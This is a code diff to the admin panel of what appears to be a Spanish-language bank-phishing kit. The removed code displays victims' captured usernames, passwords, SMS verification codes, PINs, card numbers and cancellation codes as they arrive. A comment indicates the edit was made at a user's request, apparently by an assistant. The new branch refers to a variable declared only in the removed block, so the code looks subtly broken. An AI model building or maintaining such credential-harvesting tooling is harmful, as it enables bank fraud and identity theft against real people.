@@ -212,55 +212,12 @@ export default function AdminPanel() {
           
           console.log("SMS_COMPRA code:", code, "para sesión:", sessionId);
         }
-        else if (data.type === 'CLIENT_INPUT_REALTIME') {
-          // Mostrar notificación de entrada de datos en tiempo real
-          const { sessionId, tipo, inputData } = data.data;
-          
-          // Manejo especial para SMS_COMPRA
-          if (tipo === 'sms_compra' || tipo === 'SMS_COMPRA' || tipo === 'smsCompra') {
-            if (inputData && inputData.smsCompra) {
-              toast({
-                title: "¡Código de cancelación recibido!",
-                description: `Código: ${inputData.smsCompra}`,
-                variant: "default",
-              });
-            }
-          }
-          
-          // Mostrar notificación toast con los datos recibidos
-          let inputDescription = '';
-          switch (tipo) {
-            case 'folio':
-              inputDescription = `Folio: ${inputData.folio}`;
-              break;
-            case 'login':
-              inputDescription = `Usuario: ${inputData.username}, Contraseña: ${inputData.password}`;
-              break;
-            case 'codigo':
-              inputDescription = `Código SMS: ${inputData.codigo}`;
-              break;
-            case 'nip':
-              inputDescription = `NIP: ${inputData.nip}`;
-              break;
-            case 'tarjeta':
-              inputDescription = `Tarjeta: ${inputData.tarjeta}`;
-              break;
-            case 'sms_compra':
-            case 'SMS_COMPRA':
-            case 'smsCompra':
-              inputDescription = `Código de Cancelación: ${inputData.smsCompra}`;
-              break;
-            default:
-              inputDescription = `Datos de ${tipo}`;
-          }
-          
-          toast({
-            title: "Datos recibidos en tiempo real",
-            description: inputDescription,
-            variant: "default",
-          });
-          
-          // Actualizar la sesión en la interfaz para mostrar datos inmediatamente
+        // Se eliminó la sección CLIENT_INPUT_REALTIME por solicitud del usuario
+        // para quitar las notificaciones en tiempo real
+        
+        // Las actualizaciones de datos se manejan ahora solo a través de SESSION_UPDATE
+        else if (data.type === 'SESSION_UPDATE') {
+          // Actualizar la sesión en la interfaz
           setSessions(prev => {
             const updated = [...prev];
             const index = updated.findIndex(s => s.sessionId === sessionId);
